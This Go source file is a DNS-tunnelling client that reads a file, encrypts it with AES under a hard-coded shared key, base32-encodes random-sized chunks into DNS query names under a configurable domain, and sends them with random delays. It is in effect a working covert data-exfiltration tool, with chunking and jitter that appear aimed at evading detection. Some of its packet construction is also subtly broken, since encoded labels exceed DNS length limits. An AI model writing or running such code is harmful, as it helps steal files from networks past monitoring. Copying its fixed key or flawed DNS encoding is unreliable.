package main

import (
	"crypto/aes"
	"crypto/cipher"
	crand "crypto/rand"
	"encoding/base32"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"math/rand"
	"net"
	"strings"
	"time"
)

var (
	fqdn     string
	filePath string
	debug    bool
	key      = []byte("0123456789abcdef0123456789abcdef") // Same key as server
)

func main() {
	log.SetFlags(log.Ltime | log.Lmicroseconds)
	flag.StringVar(&fqdn, "fqdn", "tunnel.local.", "FQDN to send data to (include trailing dot)")
	flag.StringVar(&filePath, "file", "", "File to send")
	flag.BoolVar(&debug, "debug", false, "Enable debug output")
	flag.Parse()

	if !strings.HasSuffix(fqdn, ".") {
		fqdn = fqdn + "."
	}

	if filePath == "" {
		log.Fatal("Please specify a file to send")
	}

	log.Printf("Starting client - will send to %s", fqdn)
	log.Printf("Reading file: %s", filePath)

	data, err := ioutil.ReadFile(filePath)
	if err != nil {
		log.Fatal("Failed to read file:", err)
	}
	log.Printf("Read %d bytes from file", len(data))

	fileID := fmt.Sprintf("%x", time.Now().UnixNano())
	chunks := splitIntoChunks(data)
	log.Printf("Split into %d chunks", len(chunks))

	for i, chunk := range chunks {
		log.Printf("Processing chunk %d/%d (%d bytes)", i+1, len(chunks), len(chunk))

		encrypted, err := encrypt(chunk)
		if err != nil {
			log.Printf("ERROR: Encryption failed for chunk %d: %v", i, err)
			continue
		}
		log.Printf("Encrypted size: %d bytes", len(encrypted))

		encoded := base32.StdEncoding.EncodeToString(encrypted)
		log.Printf("Base32 encoded size: %d bytes", len(encoded))

		query := fmt.Sprintf("%s.%d.%s.%s", fileID, i, encoded, fqdn)
		log.Printf("Sending query: %s", query)

		err = sendDNSQuery(query)
		if err != nil {
			log.Printf("ERROR: Failed to send chunk %d: %v", i, err)
			continue
		}

		jitterMs := rand.Intn(500)
		log.Printf("Chunk %d/%d sent. Waiting %dms...", i+1, len(chunks), jitterMs)
		time.Sleep(time.Duration(jitterMs) * time.Millisecond)
	}
}

func splitIntoChunks(data []byte) [][]byte {
	if debug {
		log.Printf("DEBUG: Splitting %d bytes into chunks", len(data))
	}

	var chunks [][]byte
	for len(data) > 0 {
		chunkSize := rand.Intn(21) + 20 // 20-40 bytes
		if chunkSize > len(data) {
			chunkSize = len(data)
		}
		if debug {
			log.Printf("DEBUG: Creating chunk of size %d bytes", chunkSize)
		}
		chunks = append(chunks, data[:chunkSize])
		data = data[chunkSize:]
	}
	return chunks
}

func encrypt(plaintext []byte) ([]byte, error) {
	if debug {
		log.Printf("DEBUG: Encrypting %d bytes", len(plaintext))
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, fmt.Errorf("creating cipher: %v", err)
	}

	ciphertext := make([]byte, aes.BlockSize+len(plaintext))
	iv := ciphertext[:aes.BlockSize]
	if _, err := crand.Read(iv); err != nil {
		return nil, fmt.Errorf("generating IV: %v", err)
	}

	if debug {
		log.Printf("DEBUG: Generated IV, final ciphertext will be %d bytes", len(ciphertext))
	}

	stream := cipher.NewCFBEncrypter(block, iv)
	stream.XORKeyStream(ciphertext[aes.BlockSize:], plaintext)

	return ciphertext, nil
}

func sendDNSQuery(query string) error {
	serverAddr := "127.0.0.1:53"
	log.Printf("Connecting to DNS server at %s", serverAddr)

	conn, err := net.Dial("udp4", serverAddr) // Explicitly use UDP4
	if err != nil {
		return fmt.Errorf("connection failed: %v", err)
	}
	defer conn.Close()

	localAddr := conn.LocalAddr()
	remoteAddr := conn.RemoteAddr()
	log.Printf("Connected from %s to %s", localAddr, remoteAddr)

	packet := createDNSPacket(query)
	n, err := conn.Write(packet)
	if err != nil {
		return fmt.Errorf("write failed: %v", err)
	}
	log.Printf("Wrote %d bytes to %s", n, remoteAddr)

	// Try to read response
	response := make([]byte, 512)
	conn.SetReadDeadline(time.Now().Add(time.Second))
	n, err = conn.Read(response)
	if err != nil {
		log.Printf("No response received: %v", err)
	} else {
		log.Printf("Received %d bytes response", n)
	}

	return nil
}

func createDNSPacket(query string) []byte {
	log.Printf("Creating DNS packet for query: %s", query)

	packet := make([]byte, 512)

	// DNS Header (12 bytes)
	id := uint16(rand.Int()) // Random query ID
	packet[0] = byte(id >> 8)
	packet[1] = byte(id)

	packet[2] = 0x01 // QR=0, OPCODE=0, AA=0, TC=0, RD=1
	packet[3] = 0x00 // RA=0, Z=0, RCODE=0
	packet[4] = 0x00 // QDCOUNT high byte
	packet[5] = 0x01 // QDCOUNT low byte = 1
	packet[6] = 0x00 // ANCOUNT = 0
	packet[7] = 0x00
	packet[8] = 0x00 // NSCOUNT = 0
	packet[9] = 0x00
	packet[10] = 0x00 // ARCOUNT = 0
	packet[11] = 0x00

	// DNS Question section
	offset := 12
	labels := strings.Split(query, ".")

	log.Printf("Processing %d labels: %v", len(labels), labels)

	for _, label := range labels {
		if len(label) > 0 {
			packet[offset] = byte(len(label))
			offset++
			copy(packet[offset:], label)
			offset += len(label)
			log.Printf("Added label: %s (length: %d)", label, len(label))
		}
	}

	// Terminating byte for name
	packet[offset] = 0x00
	offset++

	// QTYPE = A (0x0001)
	packet[offset] = 0x00
	packet[offset+1] = 0x01

	// QCLASS = IN (0x0001)
	packet[offset+2] = 0x00
	packet[offset+3] = 0x01

	finalLength := offset + 4
	log.Printf("Created packet of length %d bytes", finalLength)
	log.Printf("Packet header: % x", packet[:12])
	log.Printf("Full packet: % x", packet[:finalLength])

	return packet[:finalLength]
}
